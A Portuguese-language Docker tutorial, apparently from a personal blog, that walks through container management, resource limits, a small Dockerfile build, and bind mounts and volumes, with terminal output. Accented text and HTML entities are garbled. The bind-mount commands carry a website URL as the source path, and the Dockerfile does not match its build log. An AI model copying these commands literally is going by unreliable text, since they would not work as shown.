root@osboxes:~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ca53ed399c0d centos &amp;#34;/bin/bash&amp;#34; 2 minutes ago Up 2 minutes pensive_turing root@osboxes:~# Como fa√ßo para voltar, agora utilizo o comando docker container attach &#43; [CONTAINER ID]
#$docker container attach ca53ed399c0d
root@osboxes:~# docker container attach ca53ed399c0d [root@ca53ed399c0d /]# cat /etc/redhat-release CentOS Linux release 8.2.2004 (Core) Agora se eu subir um container do nginx por exemplo, nunca use a flag -ti vai parecer que est√° travado, acontece que voc√™ pediu para ele criar o container do nginx com interatividade, mas acontece que ele vai tentar abrir uma console, s√≥ que o entrypoint do nginx n√£o √© o bash, √© o pr√≥prio processo.
Todo processo tem que estar em execu√ß√£o em primeiro plano, em foreign ground.
Mesmo se voc√™ attachar o nginx para tentar acessa-lo ficara parecendo que esta travando, novamente, o nginx est√° rodando em primeiro plano, se voc√™ entrar nele e sair, vai matar o container dele.
Ou seja neste caso n√£o pode estar rodando como daemon.
Neste caso n√£o vou utilizar ele com o -ti mas sim como -d, para rodar como daemon e n√£o com interatividade.
$ docker container run nginx Primeiro eu rodo o run sem a flag -d para ele baixar o container pra mim localmente. Ai ent√£o rodo com a flag para ele deixar o processo do nginx como daemon.
$ docker container run -d nginx root@osboxes:~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES fecca31902c0 nginx &amp;#34;/docker-entrypoint.‚Ä¶&amp;#34; About a minute ago Up About a minute 80/tcp affectionate_dijkstra ca53ed399c0d centos &amp;#34;/bin/bash&amp;#34; 34 hours ago Up 34 hours pensive_turing Agora tenho o CentOS e o Nginx rodando.
Para que eu possa acessar esse container do nginx, visto que o entrypoint dele √© o pr√≥prio processo, eu executo o comando exec
O comando exec me permite rodar comandos no container e me tr√°s os resultados em tela, neste caso posso executar comandos como &amp;ldquo;ls, cat&amp;rdquo; normalmente.
root@osboxes:~# docker container exec -ti fecca31902c0 ls bin dev	docker-entrypoint.sh home lib64 mnt proc run srv tmp var boot docker-entrypoint.d etc	lib media opt root sbin sys usr Para ficar melhor, posso executar o bash diretamente.
root@osboxes:~# docker container exec -ti fecca31902c0 bash root@fecca31902c0:/# cat /etc/issue Debian GNU/Linux 10 \n \l Posso ver at√© mesmo que o nginx est√° configurado com a p√°gina de boas vindas certinho.
root@fecca31902c0:/usr/share/nginx# curl localhost &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;Welcome to nginx!&amp;lt;/title&amp;gt; &amp;lt;style&amp;gt; body { width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; } &amp;lt;/style&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;h1&amp;gt;Welcome to nginx!&amp;lt;/h1&amp;gt; &amp;lt;p&amp;gt;If you see this page, the nginx web server is successfully installed and working. Further configuration is required.&amp;lt;/p&amp;gt; &amp;lt;p&amp;gt;For online documentation and support please refer to &amp;lt;a href=&amp;#34;http://nginx.org/&amp;#34;&amp;gt;nginx.org&amp;lt;/a&amp;gt;.&amp;lt;br/&amp;gt; Commercial support is available at &amp;lt;a href=&amp;#34;http://nginx.com/&amp;#34;&amp;gt;nginx.com&amp;lt;/a&amp;gt;.&amp;lt;/p&amp;gt; &amp;lt;p&amp;gt;&amp;lt;em&amp;gt;Thank you for using nginx.&amp;lt;/em&amp;gt;&amp;lt;/p&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; Se eu der um CTRL&#43;D para sair do container, ele n√£o vai matar o container por que o processo principal n√£o era o bash, mas sim o daemon que rodei l√° atr√°s.
root@fecca31902c0:/usr/share/nginx# exit root@osboxes:~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES fecca31902c0 nginx &amp;#34;/docker-entrypoint.‚Ä¶&amp;#34; 21 minutes ago Up 21 minutes 80/tcp affectionate_dijkstra ca53ed399c0d centos &amp;#34;/bin/bash&amp;#34; 34 hours ago Up 34 hours pensive_turing Rodar como daemon √© n√£o rodar este cara em primeiro plano, eu coloco -d nos casos que n√£o quero ter interatividade, s√≥ quero que a aplica√ß√£o rode.
E o comando stop eu paro os containers criados.
root@osboxes:~# docker container stop fecca31902c0 fecca31902c0 root@osboxes:~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ca53ed399c0d centos &amp;#34;/bin/bash&amp;#34; 34 hours ago Up 34 hours pensive_turing root@osboxes:~# docker container stop ca53ed399c0d ca53ed399c0d root@osboxes:~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES root@osboxes:~# Assim como tamb√©m posso startar novamente
root@osboxes:~# docker container start fecca31902c0 fecca31902c0 root@osboxes:~# docker container start ca53ed399c0d ca53ed399c0d root@osboxes:~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES fecca31902c0 nginx &amp;#34;/docker-entrypoint.‚Ä¶&amp;#34; 37 minutes ago Up 11 seconds 80/tcp affectionate_dijkstra ca53ed399c0d centos &amp;#34;/bin/bash&amp;#34; 34 hours ago Up 3 seconds pensive_turing E tamb√©m tenho o restart do container, caso precise.
root@osboxes:~# docker container restart fecca31902c0 fecca31902c0 O comando insepect vai trazer os detalhes daquele container.
root@osboxes:~# docker container inspect fecca31902c0 [ { &amp;#34;Id&amp;#34;: &amp;#34;fecca31902c05350d920db4c3ed35793d64b155e06894ce15c026a8632c74e2e&amp;#34;, &amp;#34;Created&amp;#34;: &amp;#34;2020-10-10T03:11:02.088105653Z&amp;#34;, &amp;#34;Path&amp;#34;: &amp;#34;/docker-entrypoint.sh&amp;#34;, &amp;#34;Args&amp;#34;: [ &amp;#34;nginx&amp;#34;, &amp;#34;-g&amp;#34;, &amp;#34;daemon off;&amp;#34; ], &amp;#34;State&amp;#34;: { &amp;#34;Status&amp;#34;: &amp;#34;running&amp;#34;, &amp;#34;Running&amp;#34;: true, &amp;#34;Paused&amp;#34;: false, &amp;#34;Restarting&amp;#34;: false, &amp;#34;OOMKilled&amp;#34;: false, &amp;#34;Dead&amp;#34;: false, &amp;#34;Pid&amp;#34;: 83380, &amp;#34;ExitCode&amp;#34;: 0, &amp;#34;Error&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;StartedAt&amp;#34;: &amp;#34;2020-10-10T03:49:45.95038292Z&amp;#34;, &amp;#34;FinishedAt&amp;#34;: &amp;#34;2020-10-10T03:49:45.218821799Z&amp;#34; }, &amp;#34;Image&amp;#34;: &amp;#34;sha256:992e3b7be0465856d44bed9b3d5596267205a4cfaec4241439be42f77b3539a3&amp;#34;, &amp;#34;ResolvConfPath&amp;#34;: &amp;#34;/var/lib/docker/containers/fecca31902c05350d920db4c3ed35793d64b155e06894ce15c026a8632c74e2e/resolv.conf&amp;#34;, &amp;#34;HostnamePath&amp;#34;: &amp;#34;/var/lib/docker/containers/fecca31902c05350d920db4c3ed35793d64b155e06894ce15c026a8632c74e2e/hostname&amp;#34;, &amp;#34;HostsPath&amp;#34;: &amp;#34;/var/lib/docker/containers/fecca31902c05350d920db4c3ed35793d64b155e06894ce15c026a8632c74e2e/hosts&amp;#34;, &amp;#34;LogPath&amp;#34;: &amp;#34;/var/lib/docker/containers/fecca31902c05350d920db4c3ed35793d64b155e06894ce15c026a8632c74e2e/fecca31902c05350d920db4c3ed35793d64b155e06894ce15c026a8632c74e2e-json.log&amp;#34;, &amp;#34;Name&amp;#34;: &amp;#34;/affectionate_dijkstra&amp;#34;, &amp;#34;RestartCount&amp;#34;: 0, &amp;#34;Driver&amp;#34;: &amp;#34;overlay2&amp;#34;, &amp;#34;Platform&amp;#34;: &amp;#34;linux&amp;#34;, &amp;#34;MountLabel&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;ProcessLabel&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;AppArmorProfile&amp;#34;: &amp;#34;docker-default&amp;#34;, &amp;#34;ExecIDs&amp;#34;: null, &amp;#34;HostConfig&amp;#34;: { &amp;#34;Binds&amp;#34;: null, &amp;#34;ContainerIDFile&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;LogConfig&amp;#34;: { &amp;#34;Type&amp;#34;: &amp;#34;json-file&amp;#34;, &amp;#34;Config&amp;#34;: {} }, &amp;#34;NetworkMode&amp;#34;: &amp;#34;default&amp;#34;, &amp;#34;PortBindings&amp;#34;: {}, &amp;#34;RestartPolicy&amp;#34;: { &amp;#34;Name&amp;#34;: &amp;#34;no&amp;#34;, &amp;#34;MaximumRetryCount&amp;#34;: 0 }, &amp;#34;AutoRemove&amp;#34;: false, &amp;#34;VolumeDriver&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;VolumesFrom&amp;#34;: null, &amp;#34;CapAdd&amp;#34;: null, &amp;#34;CapDrop&amp;#34;: null, &amp;#34;Capabilities&amp;#34;: null, &amp;#34;Dns&amp;#34;: [], &amp;#34;DnsOptions&amp;#34;: [], &amp;#34;DnsSearch&amp;#34;: [], &amp;#34;ExtraHosts&amp;#34;: null, &amp;#34;GroupAdd&amp;#34;: null, &amp;#34;IpcMode&amp;#34;: &amp;#34;private&amp;#34;, &amp;#34;Cgroup&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;Links&amp;#34;: null, &amp;#34;OomScoreAdj&amp;#34;: 0, &amp;#34;PidMode&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;Privileged&amp;#34;: false, &amp;#34;PublishAllPorts&amp;#34;: false, &amp;#34;ReadonlyRootfs&amp;#34;: false, &amp;#34;SecurityOpt&amp;#34;: null, &amp;#34;UTSMode&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;UsernsMode&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;ShmSize&amp;#34;: 67108864, &amp;#34;Runtime&amp;#34;: &amp;#34;runc&amp;#34;, &amp;#34;ConsoleSize&amp;#34;: [ 0, 0 ], &amp;#34;Isolation&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;CpuShares&amp;#34;: 0, &amp;#34;Memory&amp;#34;: 0, &amp;#34;NanoCpus&amp;#34;: 0, &amp;#34;CgroupParent&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;BlkioWeight&amp;#34;: 0, &amp;#34;BlkioWeightDevice&amp;#34;: [], &amp;#34;BlkioDeviceReadBps&amp;#34;: null, &amp;#34;BlkioDeviceWriteBps&amp;#34;: null, &amp;#34;BlkioDeviceReadIOps&amp;#34;: null, &amp;#34;BlkioDeviceWriteIOps&amp;#34;: null, &amp;#34;CpuPeriod&amp;#34;: 0, &amp;#34;CpuQuota&amp;#34;: 0, &amp;#34;CpuRealtimePeriod&amp;#34;: 0, &amp;#34;CpuRealtimeRuntime&amp;#34;: 0, &amp;#34;CpusetCpus&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;CpusetMems&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;Devices&amp;#34;: [], &amp;#34;DeviceCgroupRules&amp;#34;: null, &amp;#34;DeviceRequests&amp;#34;: null, &amp;#34;KernelMemory&amp;#34;: 0, &amp;#34;KernelMemoryTCP&amp;#34;: 0, &amp;#34;MemoryReservation&amp;#34;: 0, &amp;#34;MemorySwap&amp;#34;: 0, &amp;#34;MemorySwappiness&amp;#34;: null, &amp;#34;OomKillDisable&amp;#34;: false, &amp;#34;PidsLimit&amp;#34;: null, &amp;#34;Ulimits&amp;#34;: null, &amp;#34;CpuCount&amp;#34;: 0, &amp;#34;CpuPercent&amp;#34;: 0, &amp;#34;IOMaximumIOps&amp;#34;: 0, &amp;#34;IOMaximumBandwidth&amp;#34;: 0, &amp;#34;MaskedPaths&amp;#34;: [ &amp;#34;/proc/asound&amp;#34;, &amp;#34;/proc/acpi&amp;#34;, &amp;#34;/proc/kcore&amp;#34;, &amp;#34;/proc/keys&amp;#34;, &amp;#34;/proc/latency_stats&amp;#34;, &amp;#34;/proc/timer_list&amp;#34;, &amp;#34;/proc/timer_stats&amp;#34;, &amp;#34;/proc/sched_debug&amp;#34;, &amp;#34;/proc/scsi&amp;#34;, &amp;#34;/sys/firmware&amp;#34; ], &amp;#34;ReadonlyPaths&amp;#34;: [ &amp;#34;/proc/bus&amp;#34;, &amp;#34;/proc/fs&amp;#34;, &amp;#34;/proc/irq&amp;#34;, &amp;#34;/proc/sys&amp;#34;, &amp;#34;/proc/sysrq-trigger&amp;#34; ] }, &amp;#34;GraphDriver&amp;#34;: { &amp;#34;Data&amp;#34;: { &amp;#34;LowerDir&amp;#34;: &amp;#34;/var/lib/docker/overlay2/26828e39601076b546dccc85c380c95cf5cc0b522e323146d1b95d11ea7937f0-init/diff:/var/lib/docker/overlay2/84650e899c555dc002159c3c23c29e89e034100f74fd3cbb06e780ad664becf9/diff:/var/lib/docker/overlay2/1e436d1da6e23864fe43e1edc99b400aedf747d7c40c233334adc8dc8d605863/diff:/var/lib/docker/overlay2/ea346940afd1708c365a570cc67b1736ff34fe3abee91a19cd79ce0456dcfc80/diff:/var/lib/docker/overlay2/7a5860acc38166730e81c14f29786ca662e46d9a3470b89db74bf2c6f22373e9/diff:/var/lib/docker/overlay2/5fe8bdb9845162cbb357ac3c5d2a24ebedacca1d689eb69c1658d408fb5896db/diff&amp;#34;, &amp;#34;MergedDir&amp;#34;: &amp;#34;/var/lib/docker/overlay2/26828e39601076b546dccc85c380c95cf5cc0b522e323146d1b95d11ea7937f0/merged&amp;#34;, &amp;#34;UpperDir&amp;#34;: &amp;#34;/var/lib/docker/overlay2/26828e39601076b546dccc85c380c95cf5cc0b522e323146d1b95d11ea7937f0/diff&amp;#34;, &amp;#34;WorkDir&amp;#34;: &amp;#34;/var/lib/docker/overlay2/26828e39601076b546dccc85c380c95cf5cc0b522e323146d1b95d11ea7937f0/work&amp;#34; }, &amp;#34;Name&amp;#34;: &amp;#34;overlay2&amp;#34; }, &amp;#34;Mounts&amp;#34;: [], &amp;#34;Config&amp;#34;: { &amp;#34;Hostname&amp;#34;: &amp;#34;fecca31902c0&amp;#34;, &amp;#34;Domainname&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;User&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;AttachStdin&amp;#34;: false, &amp;#34;AttachStdout&amp;#34;: false, &amp;#34;AttachStderr&amp;#34;: false, &amp;#34;ExposedPorts&amp;#34;: { &amp;#34;80/tcp&amp;#34;: {} }, &amp;#34;Tty&amp;#34;: false, &amp;#34;OpenStdin&amp;#34;: false, &amp;#34;StdinOnce&amp;#34;: false, &amp;#34;Env&amp;#34;: [ &amp;#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&amp;#34;, &amp;#34;NGINX_VERSION=1.19.3&amp;#34;, &amp;#34;NJS_VERSION=0.4.4&amp;#34;, &amp;#34;PKG_RELEASE=1~buster&amp;#34; ], &amp;#34;Cmd&amp;#34;: [ &amp;#34;nginx&amp;#34;, &amp;#34;-g&amp;#34;, &amp;#34;daemon off;&amp;#34; ], &amp;#34;Image&amp;#34;: &amp;#34;nginx&amp;#34;, &amp;#34;Volumes&amp;#34;: null, &amp;#34;WorkingDir&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;Entrypoint&amp;#34;: [ &amp;#34;/docker-entrypoint.sh&amp;#34; ], &amp;#34;OnBuild&amp;#34;: null, &amp;#34;Labels&amp;#34;: { &amp;#34;maintainer&amp;#34;: &amp;#34;NGINX Docker Maintainers &amp;lt;docker-maint@nginx.com&amp;gt;&amp;#34; }, &amp;#34;StopSignal&amp;#34;: &amp;#34;SIGTERM&amp;#34; }, &amp;#34;NetworkSettings&amp;#34;: { &amp;#34;Bridge&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;SandboxID&amp;#34;: &amp;#34;025bdf57c2c369552c5538135b7e5007d4491807375357f7bce90a802291915a&amp;#34;, &amp;#34;HairpinMode&amp;#34;: false, &amp;#34;LinkLocalIPv6Address&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;LinkLocalIPv6PrefixLen&amp;#34;: 0, &amp;#34;Ports&amp;#34;: { &amp;#34;80/tcp&amp;#34;: null }, &amp;#34;SandboxKey&amp;#34;: &amp;#34;/var/run/docker/netns/025bdf57c2c3&amp;#34;, &amp;#34;SecondaryIPAddresses&amp;#34;: null, &amp;#34;SecondaryIPv6Addresses&amp;#34;: null, &amp;#34;EndpointID&amp;#34;: &amp;#34;61173c80ab6b1c9c01b93c48df85a8dfb3612d644d38a084e3abad2a7e24f0d0&amp;#34;, &amp;#34;Gateway&amp;#34;: &amp;#34;172.17.0.1&amp;#34;, &amp;#34;GlobalIPv6Address&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;GlobalIPv6PrefixLen&amp;#34;: 0, &amp;#34;IPAddress&amp;#34;: &amp;#34;172.17.0.2&amp;#34;, &amp;#34;IPPrefixLen&amp;#34;: 16, &amp;#34;IPv6Gateway&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;MacAddress&amp;#34;: &amp;#34;02:42:ac:11:00:02&amp;#34;, &amp;#34;Networks&amp;#34;: { &amp;#34;bridge&amp;#34;: { &amp;#34;IPAMConfig&amp;#34;: null, &amp;#34;Links&amp;#34;: null, &amp;#34;Aliases&amp;#34;: null, &amp;#34;NetworkID&amp;#34;: &amp;#34;6bf2ac8e47d6de141905be78499c34f36b89ace5586c89a38be3090a8881365c&amp;#34;, &amp;#34;EndpointID&amp;#34;: &amp;#34;61173c80ab6b1c9c01b93c48df85a8dfb3612d644d38a084e3abad2a7e24f0d0&amp;#34;, &amp;#34;Gateway&amp;#34;: &amp;#34;172.17.0.1&amp;#34;, &amp;#34;IPAddress&amp;#34;: &amp;#34;172.17.0.2&amp;#34;, &amp;#34;IPPrefixLen&amp;#34;: 16, &amp;#34;IPv6Gateway&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;GlobalIPv6Address&amp;#34;: &amp;#34;&amp;#34;, &amp;#34;GlobalIPv6PrefixLen&amp;#34;: 0, &amp;#34;MacAddress&amp;#34;: &amp;#34;02:42:ac:11:00:02&amp;#34;, &amp;#34;DriverOpts&amp;#34;: null } } } } ] root@osboxes:~# Posso tamb√©m pausar um container com o comando pause
root@osboxes:~# docker container pause fecca31902c0 fecca31902c0 root@osboxes:~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES fecca31902c0 nginx &amp;#34;/docker-entrypoint.‚Ä¶&amp;#34; 43 minutes ago Up 5 minutes (Paused) 80/tcp affectionate_dijkstra ca53ed399c0d centos &amp;#34;/bin/bash&amp;#34; 35 hours ago Up 6 minutes pensive_turing root@osboxes:~# docker container unpause fecca31902c0 fecca31902c0 root@osboxes:~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES fecca31902c0 nginx &amp;#34;/docker-entrypoint.‚Ä¶&amp;#34; 43 minutes ago Up 5 minutes 80/tcp affectionate_dijkstra ca53ed399c0d centos &amp;#34;/bin/bash&amp;#34; 35 hours ago Up 6 minutes pensive_turing Para que eu possa ver os logs deste container, utilizo o comando logs seguido da flag -f e ID para ficar monitorando.
root@osboxes:~# docker container logs -f fecca31902c0 /docker-entrypoint.sh: /docker-entrypoint.d/ is not empty, will attempt to perform configuration /docker-entrypoint.sh: Looking for shell scripts in /docker-entrypoint.d/ /docker-entrypoint.sh: Launching /docker-entrypoint.d/10-listen-on-ipv6-by-default.sh 10-listen-on-ipv6-by-default.sh: Getting the checksum of /etc/nginx/conf.d/default.conf 10-listen-on-ipv6-by-default.sh: Enabled listen on IPv6 in /etc/nginx/conf.d/default.conf /docker-entrypoint.sh: Launching /docker-entrypoint.d/20-envsubst-on-templates.sh /docker-entrypoint.sh: Configuration complete; ready for start up 127.0.0.1 - - [10/Oct/2020:03:26:52 &#43;0000] &amp;#34;GET / HTTP/1.1&amp;#34; 200 612 &amp;#34;-&amp;#34; &amp;#34;curl/7.64.0&amp;#34; &amp;#34;-&amp;#34; /docker-entrypoint.sh: /docker-entrypoint.d/ is not empty, will attempt to perform configuration Para remover um container, basta utilizar o comando rm, por√©m se o mesmo estiver em execu√ß√£o, ele n√£o vai deixar. Para isso basta fazer um rm -f
root@osboxes:~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 425c61ede184 nginx &amp;#34;/docker-entrypoint.‚Ä¶&amp;#34; 2 minutes ago Up 2 minutes 80/tcp romantic_hofstadter ca53ed399c0d centos &amp;#34;/bin/bash&amp;#34; 35 hours ago Up 15 minutes pensive_turing root@osboxes:~# docker container rm 425c61ede184 Error response from daemon: You cannot remove a running container 425c61ede184f202b4ae9c3678c429735296fa916253dc953d723414cd3d52cb. Stop the container before attempting removal or force remove root@osboxes:~# docker container rm -f 425c61ede184 425c61ede184 root@osboxes:~# docker container rm -f 425c61ede184 425c61ede184 root@osboxes:~# docker container ls CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES ca53ed399c0d centos &amp;#34;/bin/bash&amp;#34; 35 hours ago Up 18 minutes pensive_turing Configurando CPU e mem√≥ria para os meus containers Para checar como est√° o uso de recursos do container, eu utilizo o comando stats
root@osboxes:~# docker container stats 7f824cb8005e Para testar os recursos pode-se utilizar o programa Stress.
root@7f824cb8005e:/# apt-get install stress
Para ver detalhes do seu uso, utilize
$ stress &amp;ndash;help Fiz o seguinte comando
stress --cpu 1 --vm-bytes 128 --vm 1
Posso utilizar para ver os dados tamb√©m o famoso top
root@osboxes:~# docker container top 7f824cb8005e Claro, se o mesmo estiver instalado no container
Para criar um container do nginx por exemplo com limita√ß√£o de mem√≥ria e cpu, eu posso definir isso na cria√ß√£o. Exemplo:
root@osboxes:~# docker container run -d -m 128M --cpus 0.5 nginx Neste caso estou definindo 128MB de ram para o container e que ele se limite a usar s√≥ 50% de CPU.
Posso testar utilizando o stress.
Agora quero mudar quero que utilize 80% de CPU, ent√£o eu posso fazer um update.
root@osboxes:~# docker container update --cpus 0.8 --memory 64M 7f824cb8005e Agora ele vai utilizar 80% de CPU e 64MB de mem√≥ria, para o ID que no caso √© do nginx.
Criando um Dockerfile Depois de criar uma pasta para alocar o Dockerfile, eu crio um arquivo no vim
FROM debian LABEL app=&amp;#34;BIKER&amp;#34; ENV FXSHELL=&amp;#34;Devops&amp;#34; RUN apt-get update &amp;amp;&amp;amp; apt-get install -y stress &amp;amp;&amp;amp; apt-get clean CMD stress --cpu 1 --vm-bytes 64M --vm 1 Depois de criado, vou buildar
$ docker image build -t toskeira:1.0 root@osboxes:~/tosko_dockerfile# docker image build -t toskeira:1.0 . Sending build context to Docker daemon 2.048kB Step 1/5 : FROM debian latest: Pulling from library/debian 57df1a1f1ad8: Pull complete Digest: sha256:439a6bae1ef351ba9308fc9a5e69ff7754c14516f6be8ca26975fb564cb7fb76 Status: Downloaded newer image for debian:latest ---&amp;gt; f6dcff9b59af Step 2/5 : LABEL app=&amp;#34;moranguinho&amp;#34; ---&amp;gt; Running in c329bf2c69e1 Removing intermediate container c329bf2c69e1 ---&amp;gt; d59dacfad6f9 Step 3/5 : ENV FELIPE=&amp;#34;Lindo&amp;#34; ---&amp;gt; Running in 8c2387746f05 Removing intermediate container 8c2387746f05 ---&amp;gt; 36c9c0b6beb9 Step 4/5 : RUN apt-get update &amp;amp;&amp;amp; apt-get install -y stress &amp;amp;&amp;amp; apt-get clean ---&amp;gt; Running in f4b8d2261527 Get:1 http://security.debian.org/debian-security buster/updates InRelease [65.4 kB] Get:2 http://deb.debian.org/debian buster InRelease [121 kB] Get:3 http://deb.debian.org/debian buster-updates InRelease [51.9 kB] Get:4 http://deb.debian.org/debian buster/main amd64 Packages [7906 kB] Get:5 http://security.debian.org/debian-security buster/updates/main amd64 Packages [233 kB] Get:6 http://deb.debian.org/debian buster-updates/main amd64 Packages [7868 B] Fetched 8387 kB in 11s (794 kB/s) Reading package lists... Reading package lists... Building dependency tree... Reading state information... The following NEW packages will be installed: stress 0 upgraded, 1 newly installed, 0 to remove and 1 not upgraded. Need to get 21.8 kB of archives. After this operation, 55.3 kB of additional disk space will be used. Get:1 http://deb.debian.org/debian buster/main amd64 stress amd64 1.0.4-4 [21.8 kB] debconf: delaying package configuration, since apt-utils is not installed Fetched 21.8 kB in 8s (2708 B/s) Selecting previously unselected package stress. (Reading database ... 6677 files and directories currently installed.) Preparing to unpack .../stress_1.0.4-4_amd64.deb ... Unpacking stress (1.0.4-4) ... Setting up stress (1.0.4-4) ... Removing intermediate container f4b8d2261527 ---&amp;gt; 3662327fda9e Step 5/5 : CMD stress --cpu 1 --vm-bytes 64M --vm 1 ---&amp;gt; Running in 83774952c3c4 Removing intermediate container 83774952c3c4 ---&amp;gt; d24fe1c0773b Successfully built d24fe1c0773b Successfully tagged toskeira:1.0 root@osboxes:~/tosko_dockerfile# Certo, agora se eu der um comando, docker image ls ele vai exibir a nossa imagem recem criada.
root@osboxes:~/tosko_dockerfile# docker image ls REPOSITORY TAG IMAGE ID CREATED SIZE toskeira 1.0 d24fe1c0773b About a minute ago 133MB Para executar
docker container run -d toskeira:1.0 Limitando memoria
docker container run -d --memory 64M toskeira:1.0 Posso tamb√©m utilizar o comando update.
root@osboxes:~# docker container update --cpus 0.8 --memory 64M [CONTAINER ID] Limitando CPU para 80% e memoria para 64M
#Entendendo volumes
Volumes nada mais sao do que diretorios externos ao container, que s√£o montados diretamente nele, dessa forma bypassam seu filesystem, ou seja, n√£o seguem aquele padr√£o de camadas.
A principal fun√ß√£o do volume √© persistir os dados. Diferentemente do filesystem do container, que √© vol√°til e toda informa√ß√£o escrita nele √© perdida quando o container morre, quando voc√™ escreve em um volume aquele dado continua l√°. independentemente do estado do container.
=&amp;gt; √â iniciado quando o container √© criado
=&amp;gt; Caso ocorra de j√° haver dados no diret√≥rio em que voc√™ est√° montando como volume, ou seja, se o diret√≥rio j√° existe e j√° est√° populado na imagem base, aqueles dados ser√£o copiados para o volume.
=&amp;gt; Um volume pode ser reusado e compartilhado entre os containers.
=&amp;gt; Altera√ß√µes em um volume s√£o feitas diretamente do volume.
=&amp;gt; Altera√ß√µes em um volume n√£o ir√£o com a imagem quando voc√™ fizer uma c√≥pia ou snapshot de um container.
=&amp;gt; Volumes continuam a existir mesmo se voc√™ deletar o container.
#Exemplo
Criamos uma pasta para montar nosso volume no local:
root@FXSHELL ~# mkdir /opt/moranguinho Volumes do tipo bind √© quando eu j√° tenho um diret√≥rio que quero montar especifico.
root@FXSHELL ~# docker container run -ti --mount type=bind,src=https://fxshelll.github.io/opt/moranguinho,dst=/moranguinho debian Beleza, j√° dentro do container crio um arquivo de teste dentro do volume.
root@07b30662ffc0:/# cd moranguinho/ root@07b30662ffc0:/moranguinho# ls root@07b30662ffc0:/moranguinho# ls root@07b30662ffc0:/moranguinho# touch teste root@07b30662ffc0:/moranguinho# exit exit root@FXSHELL ~# cd /opt/moranguinho/ root@FXSHELL /o/moranguinho# ls teste root@FXSHELL /o/moranguinho# Agora se eu executar um outro container, posso notar que o volume continua o mesmo e com o arquivo criado no passo anterior l√° dentro.
root@FXSHELL /o/moranguinho# docker container run -ti --mount type=bind,src=https://fxshelll.github.io/opt/moranguinho,dst=/moranguinho debian root@c72d32bd0846:/# ls bin dev moranguinho lib media opt root sbin sys usr boot etc home lib64 mnt proc run srv tmp var root@c72d32bd0846:/# cd moranguinho/ root@c72d32bd0846:/moranguinho# ls teste root@c72d32bd0846:/moranguinho# root@9911369c74af:/# df -h Filesystem Size Used Avail Use% Mounted on overlay 217G 8.8G 197G 5% / tmpfs 64M 0 64M 0% /dev tmpfs 491M 0 491M 0% /sys/fs/cgroup shm 64M 0 64M 0% /dev/shm /dev/sda1 217G 8.8G 197G 5% /moranguinho tmpfs 491M 0 491M 0% /proc/asound tmpfs 491M 0 491M 0% /proc/acpi tmpfs 491M 0 491M 0% /proc/scsi tmpfs 491M 0 491M 0% /sys/firmware root@9911369c74af:/# Este √© o volume do tipo bind
OBS: tamb√©m posso definir o volume somente como leitura definindo o parametro ro.
root@FXSHELL ~# docker container run -ti --mount type=bind,src=https://fxshelll.github.io/opt/moranguinho,dst=/moranguinho,ro debian root@FXSHELL /o/moranguinho# docker container run -ti --mount type=bind,src=https://fxshelll.github.io/opt/moranguinho,dst=/moranguinho,ro debian root@e779e386475a:/# cd moranguinho/ root@e779e386475a:/moranguinho# ls teste teste2 root@e779e386475a:/moranguinho# touch teste3 touch: cannot touch &amp;#39;teste3&amp;#39;: Read-only file system root@e779e386475a:/moranguinho# Mostrando a mensagem como read-only.
#Docker volume
Posso checar todos os volumes criados com o comando:
root@FXSHELL ~# docker volume ls DRIVER VOLUME NAME root@FXSHELL ~# docker volume create moranguinho moranguinho root@FXSHELL ~# ls snap/ tosko_dockerfile/ root@FXSHELL ~# docker volume ls DRIVER VOLUME NAME local moranguinho root@FXSHELL ~# docker volume ls DRIVER VOLUME NAME local moranguinho root@FXSHELL ~# docker volume inspect moranguinho [ { &amp;#34;CreatedAt&amp;#34;: &amp;#34;2021-01-19T20:55:40-05:00&amp;#34;, &amp;#34;Driver&amp;#34;: &amp;#34;local&amp;#34;, &amp;#34;Labels&amp;#34;: {}, &amp;#34;Mountpoint&amp;#34;: &amp;#34;/var/lib/docker/volumes/moranguinho/_data&amp;#34;, &amp;#34;Name&amp;#34;: &amp;#34;moranguinho&amp;#34;, &amp;#34;Options&amp;#34;: {}, &amp;#34;Scope&amp;#34;: &amp;#34;local&amp;#34; } ] root@FXSHELL ~# Tudo e qualquer volume no docker, vai estar dentro de &amp;ldquo;/var/lib/docker/volumes&amp;rdquo;
